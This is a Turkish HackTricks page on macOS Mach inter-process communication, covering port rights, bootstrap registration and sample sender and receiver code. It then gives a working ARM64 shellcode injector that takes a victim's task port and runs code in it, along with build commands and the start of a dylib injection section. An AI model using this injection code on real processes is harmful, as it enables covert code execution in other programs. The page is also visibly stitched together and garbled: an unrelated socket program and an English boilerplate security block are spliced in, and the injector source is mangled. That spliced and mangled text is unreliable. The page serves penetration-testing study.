# macOS IPC - Inter Process Communication

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** \[**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) bulun
* **Katılın** 💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek destek olun.

</details>

## Mach Mesajlaşması Portlar Aracılığıyla

### Temel Bilgiler

Mach, kaynakları paylaşmak için **görevleri** en küçük birim olarak kullanır ve her görev **çoklu iş parçacığı** içerebilir. Bu **görevler ve iş parçacıkları POSIX işlemlerine ve iş parçacıklarına 1:1 olarak eşlenir**.

Görevler arasındaki iletişim, Mach Arası İşlem İletişimi (IPC) aracılığıyla gerçekleşir ve **mesajlar portlar arasında aktarılır**, bu portlar çekirdek tarafından yönetilen **mesaj kuyrukları gibi davranır**.

Her işlemde bir **IPC tablosu** bulunur, burada işlemin **mach portları** bulunabilir. Bir mach portun adı aslında bir sayıdır (çekirdek nesnesine işaret eden bir işaretçi).

Bir işlem ayrıca bir port adını **farklı bir göreve** ve çekirdek bu girişi **diğer görevin IPC tablosuna ekler** şeklinde gönderebilir.

### Port Hakları

İletişimde önemli olan port hakları, bir görevin yapabileceği işlemleri tanımlar. Mümkün olan **port hakları** şunlardır ([buradan tanımlamalar](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Alma hakkı**, porta gönderilen mesajları almayı sağlar. Mach portları MPSC (çoklu üretici, tek tüketici) kuyruklarıdır, bu da demektir ki tüm sistemde her bir port için yalnızca **bir alma hakkı olabilir** (borular gibi, burada birden fazla işlemin aynı borunun okuma ucuna dosya tanımlayıcıları tutabileceği durumdan farklıdır).
* **Alma hakkına sahip bir görev**, mesajları alabilir ve **Gönderme hakları oluşturabilir**, böylece mesaj gönderebilir. Başlangıçta yalnızca **kendi görevi kendi portu üzerinde Alma hakkına sahiptir**.
* **Gönderme hakkı**, porta mesaj göndermeyi sağlar.
* Gönderme hakkı **kopyalanabilir**, böylece bir Gönderme hakkına sahip bir görev, hakkı kopyalayabilir ve **üçüncü bir göreve verebilir**.
* **Bir kez gönderme hakkı**, porta bir mesaj göndermeyi ve ardından kaybolmayı sağlar.
* **Port kümesi hakkı**, tek bir porttan ziyade bir _port kümesini_ belirtir. Bir port kümesinden bir mesaj çıkarmak, içerdiği portlardan birinden bir mesaj çıkarır. Port kümeleri, Unix'teki `select`/`poll`/`epoll`/`kqueue` gibi birkaç porta aynı anda dinlemek için kullanılabilir.
* **Ölü ad**, gerçek bir port hakkı değil, yalnızca bir yer tutucudur. Bir port yok edildiğinde, portun tüm var olan port hakları ölü adlara dönüşür.

**Görevler, SEND haklarını başkalarına aktarabilir**, böylece onlara geri mesaj gönderme yetkisi verilebilir. **SEND hakları da kopyalanabilir**, böylece bir görev hakkı çoğaltabilir ve **üçüncü bir göreve verebilir**. Bu, **aracı bir süreç olan** **başlangıç sunucusu** ile birlikte, görevler arasında etkili iletişim sağlar.

### Dosya Portları

Dosya portları, Mac portlarında dosya tanımlayıcılarını (Mach port haklarını kullanarak) kapsüllüyebilir. Belirli bir FD'den bir `fileport` oluşturmak için `fileport_makeport` kullanarak ve bir FD'den fileport oluşturmak için `fileport_makefd` kullanarak mümkündür.

### İletişim Kurma

#### Adımlar:

İletişim kanalını kurmak için **başlangıç sunucusu** (**mac**'de **launchd**) devreye girer.

1. Görev **A**, bir **yeni port başlatır** ve işlemde bir **ALMA hakkı** elde eder.
2. ALMA hakkının sahibi olan Görev **A**, port için bir **GÖNDERME hakkı oluşturur**.
3. Görev **A**, **başlangıç sunucusu** ile bir **bağlantı kurar**, portun **hizmet adını** ve **GÖNDERME hakkını** sağlar, bu işlem **başlangıç kaydı** olarak bilinir.
4. Görev **B**, hizmet adı için bir başlangıç **araması yapmak** için **başlangıç sunucusu** ile etkileşime girer. Başarılı olursa, **sunucu Görev A'dan aldığı GÖNDERME hakkını çoğaltır** ve **Görev B'ye iletir**.
5. GÖNDERME hakkı elde ettikten sonra, Görev **B**, bir **mesaj oluşturabilir** ve bunu **Görev A'ya gönderebilir**.
6. İki yönlü iletişim için genellikle Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı içeren yeni bir port oluşturur ve **Görev A'ya GÖNDERME hakkını verir**, böylece Görev A, Görev B'ye mesaj gönderebilir (iki yönlü iletişim).

Başlangıç sunucusu, bir görevin iddia ettiği hizmet adını **kimlik doğrulayamaz**. Bu, bir görevin potansiyel olarak **herhangi bir sistem görevini taklit edebileceği** anlamına gelir, örneğin yanlışlıkla **bir yetkilendirme hizmet adını iddia edebilir ve ardından her isteği onaylayabilir**.

Daha sonra, Apple, **sistem tarafından sağlanan hizmetlerin adlarını** güvenli yapılandırma dosyalarında saklar, bu dosyalar **SIP korumalı** dizinlerde bulunur: `/System/Library/LaunchDaemons` ve `/System/Library/LaunchAgents`. Her hizmet adının yanında **ilişkili ikili dosya da saklanır**. Başlangıç sunucusu, bu hizmet adları için her biri için bir **ALMA hakkı oluşturur ve saklar**.

Bu önceden tanımlanmış hizmetler için, **arama süreci biraz farklıdır**. Bir hizmet adı arandığında, launchd hizmeti dinamik olarak başlatır. Yeni iş akışı şöyle işler:

* Görev **B**, bir hizmet adı için başlangıç **araması başlatır**.
* **launchd**, görevin çalışıp çalışmadığını kontrol eder ve çalışmıyorsa, **başlatır**.
* Görev **A** (hizmet), bir **başlangıç kontrolü** gerçekleştirir. Burada, **başlangıç sunucusu bir GÖNDERME hakkı oluşturur, saklar ve ALMA hakkını Görev A'ya aktarır**.
* launchd, **GÖNDERME hakkını çoğaltır ve Görev B'ye iletir**.
* Görev **B**, bir **ALMA** hakkı ve bir **GÖNDERME** hakkı içeren yeni bir port oluşturur ve **Görev A'ya GÖNDERME hakkını verir** (hizmet), böylece Görev A, Görev B'ye mesaj gönderebilir (iki yönlü iletişim).

Ancak, bu süreç yalnızca önceden tanımlanmış sistem görevleri için geçerlidir. Sistem dışı görevler hala önceki şekilde çalışır, bu da potansiyel olarak taklit edilmesine izin verebilir.

### Bir Mach Mesajı

[Daha fazla bilgi burada bulunabilir](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` işlevi, temelde bir sistem çağrısı olan Mach mesajlarını göndermek ve almak için kullanılır. İşlev, gönderilecek mesajı ilk argüman olarak gerektirir. Bu mesaj, bir `mach_msg_header_t` yapısı ile başlamalı ve ardından gerçek mesaj içeriği gelmelidir. Yapı aşağıdaki gibi tanımlanmıştır:

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

**Alma hakkına sahip olan işlemler, bir Mach bağlantı noktasında iletileri alabilir. Tersine, gönderenlere bir \_**gönderme**\_ veya bir \_**bir kereye mahsus gönderme hakkı\*\*\_ verilir. Bir kereye mahsus gönderme hakkı, yalnızca bir ileti göndermek için kullanılır ve ardından geçersiz hale gelir.

Kolay bir **iki yönlü iletişim** sağlamak için bir işlem, _yanıt bağlantı noktası_ olarak adlandırılan bir Mach **ileti başlığı** içinde bir **mach bağlantı noktası** belirtebilir (**`msgh_local_port`**), iletiyi alan kişinin bu iletiye bir yanıt gönderebilmesi için. **`msgh_bits`** içindeki bit bayrakları, bu bağlantı noktası için bir **bir kereye mahsus gönderme hakkı** türetilip aktarılması gerektiğini **belirtmek** için kullanılabilir (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Bu tür iki yönlü iletişimin XPC iletilerinde kullanıldığını unutmayın (`xpc_connection_send_message_with_reply` ve `xpc_connection_send_message_with_reply_sync`). Ancak genellikle farklı bağlantı noktaları oluşturulur, önceki açıklandığı gibi iki yönlü iletişimi oluşturmak için.
{% endhint %}

İleti başlığının diğer alanları şunlardır:

* `msgh_size`: tüm paketin boyutu.
* `msgh_remote_port`: bu ileti gönderilen bağlantı noktası.
* `msgh_voucher_port`: [mach fişleri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: bu ileti ID'si, alıcı tarafından yorumlanır.

{% hint style="danger" %}
**Mach iletileri, Mach çekirdeğine yerleştirilmiş olan, tek alıcı, çoklu gönderici iletişim kanalı olan bir **_**mach bağlantı noktası**_** üzerinden gönderilir.** Birden fazla işlem, bir mach bağlantı noktasına ileti gönderebilir, ancak herhangi bir zamanda yalnızca **bir işlem** ondan **okuyabilir**.
{% endhint %}

### Bağlantı Noktalarını Sırala\*\*

```bash
lsmp -p <pid>
```

Bu aracı iOS'e [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) adresinden indirerek yükleyebilirsiniz.

### Kod örneği

**Gönderici**nin nasıl bir bağlantı noktası tahsis ettiğine, `org.darlinghq.example` adı için bir **gönderme hakkı** oluşturduğuna ve bunu **önyükleme sunucusuna** gönderdiğine dikkat edin, gönderici bu adın **gönderme hakkını** istedi ve bunu kullanarak bir **mesaj gönderdi**.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

#### sender.c

Bu basit bir örnek C programıdır. Bu program, bir mesaj oluşturur ve bu mesajı bir Unix domain soket aracılığıyla alıcıya gönderir.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>

#define SOCKET_PATH "/tmp/ipc_socket"

int main() {
    struct sockaddr_un addr;
    int sockfd;

    sockfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket error");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr_un)) == -1) {
        perror("connect error");
        exit(EXIT_FAILURE);
    }

    char* message = "Hello, IPC!";
    if (write(sockfd, message, strlen(message)) == -1) {
        perror("write error");
    }

    close(sockfd);

    return 0;
}
```

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### Ayrıcalıklı Portlar

* **Ana bilgisayar portu**: Bir işlem bu porta **Gönderme** ayrıcalığına sahipse, **sistem hakkında bilgi** alabilir (ör. `host_processor_info`).
* **Ana bilgisayar ayrıcalıklı portu**: Bu porta **Gönderme** hakkına sahip bir işlem, bir çekirdek uzantısını yükleme gibi **ayrıcalıklı işlemler** gerçekleştirebilir. Bu izne sahip olmak için **işlem root olmalıdır**.
* Ayrıca, **`kext_request`** API'sını çağırmak için yalnızca Apple ikili dosyalarına verilen **`com.apple.private.kext*`** gibi diğer ayrıcalıklara ihtiyaç vardır.
* **Görev adı portu:** _Görev portu_ nun ayrıcalıksız bir sürümüdür. Görevi referans alır, ancak kontrol etmeye izin vermez. Yalnızca üzerinden `task_info()` işlemi yapılabilir gibi görünmektedir.
* **Görev portu** (ayrıca çekirdek portu olarak da bilinir)**:** Bu porta **Gönderme** izni ile sahip olan kişi görevi kontrol edebilir (bellek okuma/yazma, iş parçacığı oluşturma...).
* **Çağıran görev için bu portun adını almak** için `mach_task_self()` çağrısını yapın. Bu port yalnızca **`exec()`** işlemi sırasında **miras alınır**; `fork()` ile oluşturulan yeni bir görev yeni bir görev portu alır (özel bir durum olarak, bir görev `exec()` işleminden sonra yeni bir görev portu alır). Bir görev oluşturmak ve portunu almanın tek yolu, `fork()` işlemi sırasında ["port takası dansını"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) gerçekleştirirken bir görev oluşturmaktır.
* Bu porta erişim kısıtlamaları (binary `AppleMobileFileIntegrity`'den `macos_task_policy` üzerinden):
  * Uygulamanın **`com.apple.security.get-task-allow` ayrıcalığı** varsa, **aynı kullanıcıdan gelen işlemler görev portuna erişebilir** (genellikle hata ayıklama için Xcode tarafından eklenir). **Notarizasyon** işlemi bunu üretim sürümlerine izin vermez.
  * **`com.apple.system-task-ports`** ayrıcalığına sahip uygulamalar, çekirdek hariç **herhangi bir** işlemin **görev portunu alabilir**. Eski sürümlerde **`task_for_pid-allow`** olarak adlandırılıyordu. Bu yalnızca Apple uygulamalarına verilir.
  * **Root, sertifikalı çalışma zamanı olmayan** (ve Apple'dan olmayan) uygulamaların görev portlarına erişebilir.

### Görev Portu Aracılığıyla İş Parçacığına Shellcode Enjeksiyonu

Shellcode'u aşağıdaki yerden alabilirsiniz:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

#### macOS IPC (Inter-Process Communication)

**macOS IPC Mechanisms**

macOS provides several mechanisms for inter-process communication (IPC), including:

* **Mach Messages**: Low-level messaging system used by the kernel and other system services.
* **XPC Services**: Lightweight inter-process communication mechanism for macOS applications.
* **Distributed Objects**: Apple's legacy IPC mechanism, now deprecated in favor of XPC Services.
* **Apple Events**: High-level IPC mechanism used for automation and scripting.

**IPC Security Considerations**

When designing macOS applications that use IPC, consider the following security best practices:

* **Use XPC Services**: Prefer XPC Services for IPC due to its improved security features.
* **Implement Proper Entitlements**: Ensure that your application's entitlements are properly configured to restrict IPC capabilities.
* **Validate Input**: Always validate input received through IPC to prevent injection attacks.
* **Encrypt Communication**: When transmitting sensitive data over IPC, use encryption to protect against eavesdropping.

By following these best practices, you can enhance the security of your macOS applications that utilize IPC.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

Önceki programı **derleyin** ve aynı kullanıcıyla kod enjekte etmek için **yetkileri** ekleyin (aksi takdirde **sudo** kullanmanız gerekecektir).

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</detaylar>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### Görev bağlantısı aracılığıyla thread'e Dylib Enjeksiyonu

macOS'ta **thread'ler**, **Mach** veya **posix `pthread` api** kullanılarak manipüle edilebilir. Önceki enjeksiyonda oluşturduğumuz thread, Mach api kullanılarak oluşturulduğundan **posix uyumlu değil**.

Bir komutu çalıştırmak için **basit bir shellcode enjekte etmek mümkündü** çünkü bu, **posix uyumlu api'lerle çalışmayı gerektirmiyordu**, sadece Mach ile çalışıyordu. **Daha karmaşık enjeksiyonlar** için thread'in aynı zamanda **posix uyumlu olması** gerekir.

Bu nedenle, thread'i **iyileştirmek** için **`pthread_create_from_mach_thread`** çağrılmalıdır ki bu da **geçerli bir pthread oluşturacaktır**. Daha sonra, bu yeni pthread, özel kütüphaneleri yüklemek için **dlopen**'ı **çağırabilir**. Bu sayede farklı işlemleri gerçekleştirmek için yeni shellcode yazmak yerine özel kütüphaneler yüklenebilir.

Örnek dylib'leri (örneğin, bir log oluşturan ve ardından dinleyebileceğiniz bir dylib):

</details>
